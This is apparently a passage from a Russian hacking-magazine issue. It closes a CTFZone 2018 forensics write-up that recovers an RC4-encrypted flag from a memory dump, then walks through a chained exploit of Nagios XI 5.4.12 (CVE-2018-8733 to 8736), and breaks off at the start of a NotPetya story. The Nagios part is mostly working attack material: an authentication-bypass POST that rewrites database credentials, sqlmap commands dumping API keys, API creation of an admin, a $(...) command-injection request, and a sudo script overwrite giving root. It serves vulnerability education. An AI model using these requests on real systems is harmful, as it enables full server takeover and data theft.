происходит следующее (см. рисунок ниже):
 1. Прием данных от клиента:

    • размер буфера с данными (4 бай та);
    • контрольная сумма CRC32 от буфера с данными (4 байта);
    • буфер, содержащий данные, зашифрованные общим сес сионным клю‐
     чом на стороне клиента при помощи пуб личного ключа Диффи — Хел‐
     лмана от сервера (размер определяется первым полем).

 2. Проверка контрольной суммы.
 3. Расшифров ка данных общим сес сионным клю чом,  сгенерированным
   на стороне сервера при помощи пуб личного клю ча Диф фи — Хел лмана
   от клиента.
 4. Запись расшифрованных данных в файл с наз ванием ﬂag.txt.





          Прием, рас шифровка и запись данных в файл ﬂag.txt


Итог анализа
Таким образом, server.exe — это часть клиент‐серверного приложения, где
реализованы следующие функции:
 • инициализация соединения с клиентом;
 • генерация пары клю чей Диффи — Хел лма на;
 • экспорт публичного ключа Диффи — Хеллмана;
 • получение блоба публичного клю ча Диффи — Хеллмана, сгенерирован‐
   ного на стороне клиента;
 • импорт обще го сессионного ключа RC4 для рас шифровки данных со сто‐
  роны клиента;
 • отправка клиенту блоба публичного ключа Диффи — Хел лмана, сгенери‐
   рованного локально;
 • получение данных со стороны клиента;
 • проверка, расшифровка и запись данных в файл ﬂag.txt.

Стало понятно, какие именно данные пишутся в файл ﬂag.txt. Проблема в том,
что в дампе процесса server.exe эти данные могли остаться только в зашиф‐
рованном виде, так как перед сня тием дампа буфер с расшифрованными
данными умышленно был перезаписан нулями.




          Пе резапись буфера с расшифрованными данными


ПОИСК ДАННЫХ ДЛЯ ВОССТАНОВЛЕНИЯ СОДЕРЖИМОГО ФАЙЛА
FLAG.TXT
Чтобы найти содер жимое файла ﬂag.txt, нуж но как минимум знать его зашиф‐
рованное содержимое и данные для рас шифровки.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

       CTFZONE 2018:
   PRIVATE_PROBLEM
          РАЗБИРАЕМ СЛОЖНОЕ ЗАДАНИЕ НА РЕВЕРС
               И ФОРЕНЗИКУ С ЕЖЕГОДНОГО CTF
                          КОМПАНИИ BI.ZONE





По иск зашифрован ного содержимого файла flag.txt
Из кода обме на публичными ключами видно, что изна чально зашифрованное
содержимое файла ﬂag.txt находится в структуре, на которую указывает pBuf.
После использования этой структуры освобож дается выделенная память
и зануляется указатель pBuf (см. код ниже). Это не значит, что вся выделен‐
ная память перезаписывается. В связи с особенностями работы функции
free() перезаписаны могут быть только первые два поля структуры (размер
зашифрованных данных и CRC32 от зашифрованных данных). Таким образом,
можно утверждать, что зашифрованное содержимое файла ﬂag.txt находи‐
лось в памяти процесса server.exe в момент снятия дампа.


        WWW

                    Более подробно о менед жменте памяти Windows
                   можно почитать в MSDN.





               Освобож дение выделенных данных

Перед расшифровкой данных подсчитыва ется контрольная сумма для про‐
верки целостности. Перед подсчетом контрольной суммы в локальных
переменных BufLength и CRC32 сохраня ются значения из структуры по адре‐
су pBuf.





              Значение раз мера зашифрованных данных





        Значение контроль ной суммы от зашифрованных данных

Дальше значения BufLength и CRC32 не изменяются. Получается, что мы
можем легко найти зашифрованное содержимое файла ﬂag.txt в дампе.
Для этого нужно перебрать все пос ледова тельные буферы длиной 42 бай та,
CRC32 от которых совпада ет со зна чением 0xF8418A4D. Для ускорения
перебора можно считать CRC32 только от данных с заданной энтропией.
   Вот реализация на Python.


from binascii import crc32
def get_enc_data(dump, start, end):
    brute_buf = dump[start:end:]
    print("[*] search for encrypted flag ...")
    for pointer in range(end ‐ start ‐ 42):
        enc_buf = brute_buf[pointer:pointer + 42:]
        if len(set(enc_buf)) < 21:
            continue
        if CRC32 == (crc32(enc_buf) % (1<<32)):
            print("[+] encrypted flag was found")
            return enc_buf
    print("[‐] encrypted flag was not found")
    return 0


По иск сек рета Диффи — Хел лмана
Общий сессионный ключ клиента и сервера нель зя получить без знания сек‐
ретного параметра, сгенерированного при вызове функции CryptSetKey‐
Param с аргумен том KP_X. В качестве исходных данных у нас есть значения
модуля (P) и генератора (G) (g_rgbPrime и g_rgbGenerator в коде генерации
клю чей выше).


P = 0x8df2a494492276aa3d25759bb06869cbeac0d83afb8d0cf7cbb8324f0d
7882e5d0762fc5b7210eafc2e9adac32ab7aac49693dfbf83724c2ec0736ee3
1c80291
G = 0x626d027839ea0a13413163a55b4cb500299d5522956cefcb3bff10f399
ce2c2e71cb9de5fa24babf58e5b79521925c9cc42e9f6f464b088cc572af53e
6d78802

Значения стандартны и находятся в гло бальных переменных.





  Известные параметры Диффи — Хеллма на в памяти процесса server.exe

В  коде, который осво бождает выделен ные данные  (см. выше), можно
заметить следующее:
 • дамп сделан перед вызовом функции CryptReleaseContext ;
 • дамп сделан перед обнулением указателя на блоб публичного ключа Диф‐
  фи — Хеллмана, сгенерированного на стороне сервера.

Таким образом, по адресу pbKeyBlob_server находим буфер с блобом пуб‐
личного ключа сервера.





  Буфер с блобом публичного ключа Диффи — Хеллмана, сгенери рован‐
  ного на стороне сервера

Блоб имеет следующую структуру:


static BYTE pbPublicKeyBlob_server[] =
{
    // bType = PUBLICKEYBLOB
    0x06,
    // bVersion = 2
    0x02,
    // reserved
    0x00, 0x00, S
    // ALG_ID aiKeyAlg = CALG_DH_SF
    0x01, 0xAA, 0x00, 0x00,
    // DH1
    0x00, 0x44, 0x48, 0x31,
    // cbPublicKey = 512 (bit)
    0x00, 0x02, 0x00, 0x00,
    // public_server = G ^ secret_server (mod P)
    0x4c, 0x0e, 0x64, 0x84, 0x3f, 0x79, 0x3b, 0x68,
    0x00, 0x01, 0x2f, 0x24, 0x30, 0x36, 0x29, 0x7c,
    0x88, 0x22, 0x48, 0xa3, 0x99, 0x34, 0x64, 0xed,
    0x7b, 0xe2, 0x13, 0x5a, 0x2d, 0x72, 0x0b, 0x20,
    0xd8, 0x23, 0x3f, 0xb8, 0x2c, 0x0c, 0x8a, 0x75,
    0x9c, 0xc7, 0x7c, 0x50, 0x23, 0x32, 0x0d, 0x91,
    0x1d, 0xa9, 0x0d, 0x38, 0x9e, 0x22, 0xed, 0x2d,
    0xe3, 0x37, 0xfa, 0x1d, 0x41, 0x22, 0x70, 0x19
};

Последние 64 байта — публичный ключ сервера, он высчитывается по фор‐
муле в комментарии.
   Теперь мы знаем не только P и G, но и публичный ключ сервера.


public_server = 0x197094411dff37d12ddd93d7380dea1dc50d3223507ce39d7
5d50c2caa9023ec200b722d5a13d47bdd6434d6fa4893b37c293630242f0100
683b7980e4640e4c

Так как перед снятием дампа не была вызвана функция CryptReleaseCon‐
text, в памяти дол жны остаться случайно сгенерированные простые чис ла.
Таким образом, можно найти секретный параметр сервера (secret_server),
перебрав в дампе все числа длиной 64 байта, которые удовлетворяют сле‐
дующему условию:


public_server = G ^ secret_server (mod P)

Аналогично поиску зашифрованного содержимого фай ла ﬂag.txt достаточно
проверять простые числа, полученные из наборов байтов с заданной энтро‐
пией.
  Далее — реализация на Python.


# Hardcoded values
P = 0x8df2a494492276aa3d25759bb06869cbeac0d83afb8d0cf7cbb8324f0d
7882e5d0762fc5b7210eafc2e9adac32ab7aac49693dfbf83724c2ec0736ee3
1c80291
G = 0x626d027839ea0a13413163a55b4cb500299d5522956cefcb3bff10f399
ce2c2e71cb9de5fa24babf58e5b79521925c9cc42e9f6f464b088cc572af53e
6d78802
# From DH PUBLICKEYBLOB structures
public_server = 0x197094411dff37d12ddd93d7380dea1dc50d3223507ce39d7
5d50c2caa9023ec200b722d5a13d47bdd6434d6fa4893b37c293630242f0100
683b7980e4640e4c
def get_number_le(buf):
number_le = 0
for i in range(len(buf)):
    number_le += buf[i] * pow(256, i)
return number_le
def get_secret(dump, start, end, public):
    brute_buf = dump[start:end:]
    print("[*] search for secret ...")
    for pointer in range(end ‐ start ‐ 64):
        secret_buf = brute_buf[pointer:pointer + 64:]
        if len(set(secret_buf)) < 32:
            continue
        secret_number = get_number_le(secret_buf)
        if (public == pow(G, secret_number, P)):
            print("[+] secret was found: " + hex(secret_number))
            return secret_number
    print("[‐] secret was not found")
    return 0


Ге нерация сессион ного ключа шифрования
Согласно протоколу Диффи — Хеллма на, для генерации сессионного ключа
шифрования на стороне сервера необходимо знать публичный ключ клиента.
Блоб публичного ключа клиента был скопирован в память сразу пос ле при ема
сервером. Дамп процесса снят после освобождения этой памяти и обну‐
ления указате ля pbKeyBlob_client. Тем не менее пуб личный ключ клиента
все еще находится в памяти и может быть най ден в дампе по значению DH1.





       Блоб публичного ключа клиента в памяти процесса server.exe

Структура блоба публичного ключа Диффи — Хеллмана, сгенерированного
клиентом:


static BYTE pbPublicKeyBlob_client[] =
{
    // bType = PUBLICKEYBLOB
    0x06,
    // bVersion = 2
    0x02,
    // reserved
    0x00, 0x00,
    // ALG_ID aiKeyAlg = CALG_DH_EPHEM
    0x02, 0xAA, 0x00, 0x00,
    // DH1
    0x00, 0x44, 0x48, 0x31,
    // cbPublicKey = 512 (bit)
    0x00, 0x02, 0x00, 0x00,
    // g_rgbY = G ^ X (mod P)
    0x4e, 0xc0, 0x07, 0x24, 0xf2, 0xf3, 0x1a, 0x5a,
    0x38, 0xdf, 0x4e, 0x2b, 0x49, 0x7b, 0x60, 0x78,
    0xa2, 0xac, 0xbe, 0x7a, 0xbe, 0x16, 0x40, 0x06,
    0x8d, 0x44, 0xee, 0x42, 0xfb, 0x60, 0x1d, 0xec,
    0x3f, 0xf0, 0xee, 0xbf, 0x06, 0x05, 0x23, 0x80,
    0xf8, 0x3d, 0x7f, 0xe5, 0x3c, 0xfe, 0x14, 0x12,
    0xc5, 0x6f, 0x56, 0xf8, 0x29, 0x18, 0xbf, 0x44,
    0x6d, 0x9a, 0x70, 0xae, 0xe4, 0x95, 0x80, 0x18
};

Последние 64 байта структуры — публичный ключ клиента (public_client):


public_client = 0x188095e4ae709a6d44bf1829f8566fc51214fe3ce57f3df88
0230506bfeef03fec1d60fb42ee448d064016be7abeaca278607b492b4edf38
5a1af3f22407c04e

Ключ, согласованный по протоколу Диффи — Хеллмана, вычис ляется сер‐
вером следующим образом:


ses_key = public_client ^ secret_server (mod P)

Содержимое файла ﬂag.txt расшифровывается при помощи алгоритма CAL‐
G_RC4 со стандартной длиной ключа 128 бит. Таким образом, для получения
клю ча RC4 необходимо взять 128 бит от sec_key в порядке от младшего
к старшему (little‐endian).


Расшифровка флага
Мы получили все необ ходимые данные для нахож дения содержимого файла
ﬂag.txt:


ses_key = 0x2d44c53d424087361ff8f24499f75d5795e63813285627d37
b41ad6f600f96de18ef948c0fc4188f59821f0330f584ae11f1c8319201d93e
9c41049b13ccfe7b
rc4_key = b"\x7b\xfe\xcc\x13\x9b\x04\x41\x9c\x3e\xd9\x01\x92\x31\xc8\
xf1\x11"
enc_flag = b"\x7b\x20\x4e\x02\x19\xb9\xca\xd6\x1f\x3f\xdb\x02\x37\
x09\xd6\xb7\xda\x85\x6e\xf2\xfe\x2e\xa3\x1f\x05\x0c\x86\x17\xe9\xfb\
x00\xd8\x13\x7f\xbf\x9f\xa8\x9a\x8f\x8d\x71\xe8"

Интересно, что при решении CTF учас тни ки команды LC↯BC нашли свой спо‐
соб расшифров ки флага без использования значения rc4_key. В дампе про‐
цесса server.dmp остались 256 байт S‐блока (state), полученные после рас‐
ширения ключа rc4, чем они и воспользовались.





            Значение S‐блока в памяти про цес са server.dmp

После расшифровки enc_flag алго рит мом rc4 получим искомое содержимое
файла ﬂag.txt.


ЗАКЛЮЧЕНИЕ
Мы решили задание, которое предполага ет зна ние реверса, основ крип‐
тографии, а также менеджмента памяти Windows. Пол ный скрипт с решени ем
доступен на GitHub. Всем успехов на CTF!
ВЗЛОМ
  НАГНУТЬ
    NAGIOS





РАЗБИРАЕМ ХИТРУЮ ЦЕПОЧКУ
УЯЗВИМОСТЕЙ В ПОПУЛЯРНОЙ
                                                                                       aLLyСИСТЕМЕ МОНИТОРИНГА                                                                                   ONsec
                                                                                                @iamsecurity





Nagios — это одно из популярнейших решений для монито‐
ринга, которое используется во мно гих крупных компаниях.
Обнаруженные в нем уязвимости приводят к полной компро‐
метации сис темы и выполнению произволь ного кода с пра‐
вами суперпользователя, а для их эксплуатации не нуж но
обладать никакими привилегиями. Давай разберем ся, какие
ошибки допус тили разработчики и как этим можно восполь‐
зоваться.


Nagios решает довольно типичный для своего класса программ набор задач:
контроль состояния компьютерных сис тем и сетей, наблюдение за выпол‐
няющимися службами и демонами и тому подобные задачи. Также в Nagios
входит расширен ная сис тема оповещения админа об изменениях в функци‐
онировании системы, например когда какие‐то из компонентов прекращают
свою работу.
  Проблемы были обнаружены исследова телями Redacted Security и зат‐
рагивают все версии продукта вплоть до Nagios XI версии 5.4.12.


ПРИГОТОВЛЕНИЯ
Для демонстрации уязвимос ти я подниму тестовое окружение. Nagios XI мож‐
но вполне легально ска чать с официального сайта абсолютно бесплатно.
После   установ ки  он  спокойно  проработает  в  пробном  режиме
в течение 60 дней. Нам это го вполне достаточно.
  Решение поставляется в нес кольких вариантах: в виде пакета для дистри‐
бутивов Linux, в виде образа VHD для Windows с поддержкой аппаратной вир‐
туализации на основе гипервизора (Hyper‐V) и в формате OVF (Open Virtual‐
ization Format), который поддерживает ся всеми при личными приложениями
для виртуализации. Мне удобнее использовать именно последний вариант.
  Все манипуляции я буду проводить на последней уязвимой версии сис‐
темы — 5.4.12, поэтому сначала ска чаем ее образ. Пос ле этого нужно раз‐
вернуть его на вир туаль ной машине. Для этой цели подой дут как коммерчес‐
кие продукты VMware, так и бесплатные решения типа VirtualBox или того же
VMware Player.





        Импорт обра за Nagios XI 5.4.12 в VMware Workstation

Когда импорт завершится, запустим ново испеченную виртуалку, после неп‐
родолжительной загрузки видим приг лашение авторизации в систему, IP‐
адрес машины и пароль рута. По дефол ту это nagiosxi.





               Экран приветствия виртуал ки Nagios XI

Теперь, как и советует система, нужно перейти в браузере по указанному IP‐
адресу и выполнить начальную нас тройку.





               Установка Nagios XI через веб‐интерфейс

После нажатия на кнопку Install система будет готова к экспериментам.


НАЧАЛО ПУТИ. ОБХОД АВТОРИЗАЦИИ. CVE-2018-8733
В сос тав Nagios входит NagiosQL — это веб‐интерфейс для конфигурирова‐
ния системы. По дефол ту он располагается по адресу /nagiosql/. Авторизо‐
ваться можно, используя ту же связку логин‐пароль, которую мы указывали
на этапе начальной настройки.





                     Веб‐интерфейс NagiosQL

В разделе Administration есть подраздел Settings, где можно настроить
сам NagiosQL. Среди переменных здесь есть раздел Database, в котором
находятся параметры подключения к базе данных.





         Конфигурация параметров подключения к базе данных

Они записываются в конфигура ционный файл settings.php. По умолчанию он
выглядит примерно так.


/var/www/html/nagiosql/config/settings.php
01: <?php
02: exit;
03: ?>
...
20: [db]
21: server       = localhost
22: port         = 3306
23: database     = nagiosql
24: username     = nagiosql
25: password     = n@gweb
26: [common]
27: install      = passed

Разумеется, все перечисленные воз можнос ти доступны только для авторизо‐
ванного админа. Или нет? Заглянем в исходник скрипта, который отвечает
за изменения кон фига, а имен но в его начало.


/var/www/html/nagiosql/admin/settings.php
23: $intMain    = 7;
24: $intSub     = 29;
25: $intMenu    = 2;
26: $preContent = "admin/settings.tpl.htm";
27: $strMessage = "";
28: $intError   = 0;
29: //
30: // Include requirements
31: // ======================
32: $preAccess    = 1;
33: $preFieldvars = 1;
34: // Import basic function
35: require("../functions/prepend_adm.php");
36: // Import translation function
37: require("../functions/translator.php");

На 35‐й строке подгружается файл prepend_adm.php, который в том числе
выпол няет ряд проверок авто риза ции.


/var/www/html/nagiosql/functions/prepend_adm.php
164: if (($_SESSION['username'] != "") && (!isset($preNoLogCheck) ||
($preNoLogCheck == 0))) {
...
182:         if ($intResult != 0) {
183:           $myDataClass‐>writeLog(_('Restricted site accessed:').
" ".$_SERVER['PHP_SELF']);
184:           header("Location: ".$SETS['path']['protocol']."://".$
_SERVER['HTTP_HOST'].$SETS['path']['root']."admin/errorsite.php");
// todo check
185:         }
...
190:   } else {
191:     // Neues Login erzwingen
192:     $myDataClass‐>writeLog(_('User not found in database'));
193:     header("Location: ".$SETS['path']['protocol']."://".$_SERVER
['HTTP_HOST'].$SETS['path']['root']."index.php");
...
195: } else if (!isset($preNoLogin)) {
196:   // Neues Login erzwingen
197:   header("Location: ".$SETS['path']['protocol']."://".$_SERVER['
HTTP_HOST'].$SETS['path']['root']."index.php");

Чего‐то не хватает, не правда ли? А именно завершения работы скрипта пос‐
ле редиректа. Благодаря такой неос торож ности раз работчиков выполнение
кода продолжится, даже если пользователь не авторизован, и мы можем вно‐
сить изме нения в конфигура ционный файл.


/var/www/html/nagiosql/admin/settings.php
043: $selLanguage    = isset($_POST['selLanguage'])    ? $_POST['
selLanguage']                           : $SETS['data']['locale'];
...
045: $txtDBserver    = isset($_POST['txtDBserver'])    ? $_POST['
txtDBserver']                           : $SETS['db']['server'];
046: $txtDBport      = isset($_POST['txtDBport'])      ? $_POST['
txtDBport']                             : $SETS['db']['port'];
047: $txtDBname      = isset($_POST['txtDBname'])      ? $_POST['
txtDBname']                             : $SETS['db']['database'];
048: $txtDBuser      = isset($_POST['txtDBuser'])      ? $_POST['
txtDBuser']                             : $SETS['db']['username'];
049: $txtDBpass      = isset($_POST['txtDBpass'])      ? $_POST['
txtDBpass']                             : $SETS['db']['password'];
...
063: if ( (isset($_POST)) AND (isset($_POST['selLanguage']))) {
...
085:   $filSet = fopen($txtBasePath."config/settings.php","w");
086:   if ($filSet) {
087:     fwrite($filSet,"<?php\n");
088:     fwrite($filSet,"exit;\n");
089:     fwrite($filSet,"?>\n");
...
107:     fwrite($filSet,"server       = ".$txtDBserver."\n");
108:     fwrite($filSet,"port         = ".$txtDBport."\n");
109:     fwrite($filSet,"database     = ".$txtDBname."\n");
110:     fwrite($filSet,"username     = ".$txtDBuser."\n");
111:     fwrite($filSet,"password     = ".$txtDBpass."\n");
...
114:     fclose($filSet);

Все, что требуется, — это передать локаль и нужные переменные в соответс‐
твующих параметрах POST‐запроса. Он будет выг лядеть следующим обра‐
зом:


POST /nagiosql/admin/settings.php HTTP/1.1
Host: nagios.vh
Content‐Type: application/x‐www‐form‐urlencoded
Connection: close
selLanguage=en_GB&txtDBserver=localhost&txtDBuser=nagiosql&txtDBp
ass=n@gweb





       Обход авториза ции и редактирование конфига NagiosQL

Хоть сервер и вернул код 302, но скрипт продол жил свое выполнение
и перезаписал конфиг.
   Тут уже открывается некий прос тор для творчества. Можно указать
в качестве адреса базы данных свой сервак с Rogue MySQL Server и получить
читалку файлов. Также изменение некоторых параметров дает возможность
вызвать отказ в обслуживании. Но это не осо бенно интерес но. Гораз до
полезнее поменять юзера, под которым происходит соединение с базой дан‐
ных. Это поможет нам продвинуть ся к нашей цели — полной компрометации
системы. Благо по умолчанию пароль пользователя root устанавливается
в nagiosxi не только для входа в сис тему, но и для авторизации в БД.


POST /nagiosql/admin/settings.php HTTP/1.1
Host: nagios.vh
Content‐Type: application/x‐www‐form‐urlencoded
Connection: close
selLanguage=en_GB&txtDBserver=localhost&txtDBuser=root&txtDBp
ass=nagiosxi





  Изменение параметров подключения к БД в Nagios через уязвимость
  CVE‐2018‐8733



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     НАГНУТЬ NAGIOS
                    РАЗБИРАЕМ ХИТРУЮ ЦЕПОЧКУ
           УЯЗВИМОСТЕЙ В ПОПУЛЯРНОЙ СИСТЕМЕ
                              МОНИТОРИНГА





ДОБЫВАЕМ API-КЛЮЧИ ЧЕРЕЗ SQL-ИНЪЕКЦИЮ. CVE-2018-8734
Теперь заглянем еще в один раз дел веб‐морды NagiosQL, который называ‐
ется Help Editor.





      Раздел админки NagiosQL для редактирования описания ключей

Здесь можно редактировать описания различных клю чей. Заглянем в сорцы.


/var/www/html/nagiosql/admin/helpedit.php
36: require("../functions/prepend_adm.php");

Наблюдаем ту же проб лему с обходом авторизации. Сразу скажу, что она
распространяется поч ти на все скрипты админки. Дальше следуют любопыт‐
ные участки кода.


040: $chkKey1    = isset($_POST['selInfoKey1'])    ? $_POST['selInf
oKey1']   : "";
041: $chkKey2    = isset($_POST['selInfoKey2'])    ? $_POST['selInf
oKey2']   : "";
042: $chkVersion   = isset($_POST['selInfoVersion'])   ? $_POST['
selInfoVersion']  : "";
043: $chkDefault   = isset($_POST['chbDefault'])     ? $_POST['chbDef
ault']    : "0";
044: $chkHidKey1   = isset($_POST['hidKey1'])      ? $_POST['hidKey1'
]     : "";
045: $chkHidKey2   = isset($_POST['hidKey2'])      ? $_POST['hidKey2'
]     : "";
046: $chkHidVersion  = isset($_POST['hidVersion'])     ? $_POST['
hidVersion']    : "all";
047: $chkModus   = isset($_POST['modus'])      ? $_POST['modus']
       : "0";
...
055: if (($chkContent != "") && ($chkModus == "1")) {
056:   $strSQL     = "SELECT `infotext` FROM `tbl_info`
057:             WHERE `key1` = '$chkHidKey1' AND `key2` = '$chkHid
Key2' AND `version` = '$chkHidVersion'
058:               AND `language` = '$setSaveLangId'";
059:   $booReturn  = $myDBClass‐>getDataArray($strSQL,$arrData,$
intDataCount);
060:   if ($intDataCount == 0) {
061:     $strSQL = "INSERT INTO `tbl_info` (`key1`,`key2`,`version`,
`language`,`infotext`)
062:            VALUES ('$chkHidKey1','$chkHidKey2','$chkHidVersion',
'$setSaveLangId','$chkContent')";
063:   } else {
064:     $strSQL = "UPDATE `tbl_info` SET `infotext` = '$chkContent'
065:           WHERE `key1` = '$chkHidKey1' AND `key2` = '$chkHid
Key2' AND `version` = '$chkHidVersion'
066:             AND `language` = '$setSaveLangId'";
067:   }
068:   $intInsert = $myDataClass‐>dataInsert($strSQL,$intInsertId);
069: }
...
109: if ($chkKey1 != "") {
110:   $strSQL   = "SELECT DISTINCT `key2` FROM `tbl_info` WHERE
`key1` = '$chkKey1' ORDER BY `key1`";
...
123: if (($chkKey1 != "") && ($chkKey2 != "")) {
124:   $strSQL   = "SELECT DISTINCT `version` FROM `tbl_info` WHERE
`key1` = '$chkKey1' AND `key2` = '$chkKey2' ORDER BY `version`";

Здесь самая банальная error based SQL‐инъекция. Непонятно, на что наде‐
ялись разработчики, не посчитав это багом. Видимо, «скуля» в админке багом
не считается! Доволь но рас простра ненное и ошибочное мнение, которого
придерживаются разработчики и вендоры по всему миру.
   Так как пользователь, через которого мы подклю чаемся к БД, теперь root,
то мы имеем пол ный дос туп ко всем таблицам, что есть на сервере. Самое
время раскрутить уязвимость и пос мотреть, что интерес ного хранится в таб‐
лицах. Для этих целей можно привлечь всем извес тный sqlmap. Используем
параметр selInfoKey1 для более простой экс плуатации инъекции.


python sqlmap.py ‐u http://nagios.vh/nagiosql/admin/helpedit.php
‐‐data="selInfoKey1=1" ‐p selInfoKey1 ‐‐dbs ‐‐tables ‐‐exclude‐sys





           Раскручиваем SQL‐инъекцию в Nagios через sqlmap

Сразу скажу, что самое интерес ное для нас находится в таблице xi_users
из базы nagiosxi.


python sqlmap.py ‐u http://nagios.vh/nagiosql/admin/helpedit.php
‐‐data="selInfoKey1=1" ‐p selInfoKey1 ‐D nagiosxi ‐T xi_users ‐C
username,password,api_enabled,api_key ‐‐dump





       Получение интересных данных из БД через SQL‐инъекцию

По дефолту у администра тора включен доступ через API, а ключ генерируется
на этапе начальной конфигура ции и любезно записывается в таблицу.


/usr/local/nagiosxi/html/install.php
152: function do_install()
153: {
...
207:     change_user_attr($uid, "api_key", random_string(64));

Помимо этого, пароли хранятся в обычном MD5. Однако при установке
генерируется доволь но длинный пароль, и расшифровка займет слишком
много времени. Конеч но, если пароль на этапе уста новки задан вручную, то
можно попробовать.


usr/local/nagiosxi/html/install.php
046:     $admin_password = random_string(20, "$#@!.,%^&");
...
205:     change_user_attr($uid, "password", md5($admin_password));
...
213:     nagiosql_update_user_password("nagiosadmin", $admin_password
);


БАЛУЕМСЯ С API
Посмотрим, какими же метода ми располагает REST API Nagios XI. Все они
описаны во встроенном раз деле справки. Наиболее интерес на воз можность
создания пользователя через эндпоинт system/user.





         Ме тод API для соз дания пользователей в Nagios XI

Для этого нужно лишь отправить POST‐запрос с данными нового юзера
и ключ API, который мы раздобыли на предыдущем шаге.


POST /nagiosxi/api/v1/system/user?apikey=ietf9a45YnLEClWJVoKEBnGl
hcm47IeJc0Xla0JoIK2g6ef0GYUtFARcLdA9bNRH&pretty=1 HTTP/1.1
Host: nagios.vh
Content‐Type: application/x‐www‐form‐urlencoded
Connection: close
username=attacker&password=4ySlGxzVhI&name=Larry Flynt&
email=lf@localhost&auth_level=admin&force_pw_change=0





              Создание админа через REST API Nagios

Здесь самый важный параметр — это auth_level. Если мы передадим в нем
admin, то это означает, что новоиспеченный пользователь будет админом.
Что нам и нужно.
  Разумеется, это никакая не уяз вимость, а прос то стандартные возможнос‐
ти встроенного REST API, но такие штуки частень ко помогают продвигаться
внутрь периметра.


УДАЛЕННОЕ ВЫПОЛНЕНИЕ КОМАНД ЧЕРЕЗ АДМИНА. CVE-2018-
8735
Теперь можно свободно авто ризо вываться как администратор с заданными
логином и паролем и осматривать содержимое панели управле ния.
   Здесь все очень удоб но с точки зрения воз можных атак, так как в скриптах
бэкенда есть возможность выполнения команд.


/usr/local/nagiosxi/html/backend/index.php
32: route_request();
...
34: function route_request()
35: {
...
49:     // Handle the command
50:     switch ($cmd) {
...
78:         // Command subsystem
79:         case "submitcommand":
80:             backend_submit_command();

Но только определен ных команд, которые раз решены к выполнению. Для это‐
го в качестве аргумента command к функции submit_command передается чис‐
ловой ID команды, а в command_data — ее параметры.


/usr/local/nagiosxi/html/backend/includes/handler-
commands.inc.php
15: function backend_submit_command()
16: {
...
22:     // Grab the command to run...
23:     if (($command = grab_request_var("command", "")) == "") {
24:         handle_backend_error("You must enter a command (and
command data if required) to run a command.");
25:     }
26:     $command_data = grab_request_var("command_data", "");
27:     $event_time = grab_request_var("event_time", "0");
28:
29:     // Run the command through the backend (don't wait for it to
return)
30:     $command_id = submit_command($command, $command_data, $event_
time, 0);

По крайней мере так было задумано раз работчиками, но если в command_da‐
ta передать конструкцию вида $(cmd), то cmd будет выпол нена.


POST /nagiosxi/backend/index.php HTTP/1.1
Host: nagios.vh
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: nagiosxi=td9uet8udcotgm3c7s0604qbv7
Connection: close
cmd=submitcommand&command=1111&command_data=$(touch /tmp/executed)





               Удаленное выполнение команд в Nagios XI

К сожалению,  результат выполнения команды сервер не  возвращает.
Это было бы совсем здорово. :)


ИЗ ГРЯЗИ В КНЯЗИ. ПОВЫШАЕМ ПРИВИЛЕГИИ ДО ROOT. CVE-
2018-8735
Все команды, что мы отправляем через админа, выполняются с теми при‐
вилегиями, с которыми запущен веб‐сервер, а именно от пользователя na‐
gios. Это, конечно, круто, но не совсем. Нужно повышать свои при вилегии,
и в этом нам поможет sudo. Заглянем в файл с правилами предоставления
доступа root. Интересные строчки притаились в самом его конце.





             Файл кон фигура ции /etc/sudoers в Nagios XI

Скрипты change_timeone.sh, manage_services.sh, upgrade_to_latest.sh,
reset_config_perms.sh и другие дос тупны для выполнения через sudo
без запроса пароля. Теперь посмотрим в директорию скриптов.





              Листинг директории со скриптами Nagios XI

Как видишь, все скрипты принадлежат нашему пользователю nagios. Поэто‐
му мы можем свободно менять содержимое этих фай лов, а это значит, что мы
сможем выполнять произвольные команды от имени суперпользователя.
Возьмем на вооружение любой скрипт, который ука зан в /etc/sudoers. Наш
запрос примет, например, такой вид:


POST /nagiosxi/backend/index.php HTTP/1.1
Host: nagios.vh
Content‐Type: application/x‐www‐form‐urlencoded
Cookie: nagiosxi=td9uet8udcotgm3c7s0604qbv7
Connection: close
cmd=submitcommand&command=1111&command_data=$(cp /usr/local/nagiosxi/
scripts/reset_config_perms.sh /tmp/rcp.bak && echo "touch /tmp/
execroot" > /usr/local/nagiosxi/scripts/reset_config_perms.sh &&
sudo /usr/local/nagiosxi/scripts/reset_config_perms.sh && mv /tmp/
rcp.bak /usr/local/nagiosxi/scripts/reset_config_perms.sh)





       Выполнение произволь ных команд от root с помощью sudo

Только не забывай про URL Encoding. Теперь можно свободно выполнять
команды от рута!
  Для автоматизации всех этих рутинных дей ствий, конечно же, сущес твует
несколько готовых эксплоитов. Рекомендую вариант Джареда Арей ва. В нем
нужно указать хост, где уста новлен Nagios, и связку между IP и портом, если
хочешь получить бэкконнект. С помощью ключа ‐c можно определить, какую
команду требует ся выполнить на целевой системе.





              Результат работы экс плоита для Nagios XI


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Мы рассмотрели целых четыре уяз вимос ти в Nagios, которые получили иден‐
тификаторы CVE‐2018‐8733, CVE‐2018‐8734, CVE‐2018‐8735, CVE‐2018‐8736.
Использование этих багов одного за дру гим дает нам права суперполь‐
зователя на целевой системе.
   Вот так, казалось бы, прос тые уяз вимос ти могут создавать серьезные
проблемы для всей инфраструктуры в целом. Особенно стоит отметить, нас‐
колько разработчики лояльно отно сят ся к дей ствиям администратора, никак
не ограничивают и не фильтру ют данные, которые тот присылает. Такая
политика нередко приводит к показанным в статье печальным пос ледствиям.
Если ты занимаешься раз работкой, то, надеюсь, это убедит тебя не пов‐
торять такие ошибки.
ВЗЛОМ





                                                                              Никита Зличин
                                                                                                    zlicin.v@gmail.com

          ЭХО
  КИБЕРВОЙНЫ

         КАК NOTPETYA ЧУТЬ НЕ ПОТОПИЛ
         САМУЮ БОЛЬШУЮ КОМПАНИЮ
           МОРСКИХ ГРУЗОПЕРЕВОЗОК




Российское киберо ружие, постро енное на утекших у АНБ
эксплоитах, мас кировалось под вирус‐вымогатель, но целью
NotPetya было выведение из строя промышленных объектов,
а не получение прибыли. Благода ря дыре в бухгалтерском
ПО малварь ушла в свободное пла вание и нанесла колос‐
сальный ущерб многим круп ным компаниям. Одной из жертв
стал крупнейший морской грузоперевозчик — Maersk. Исто‐
рия о его заражении и устранении последствий не просто
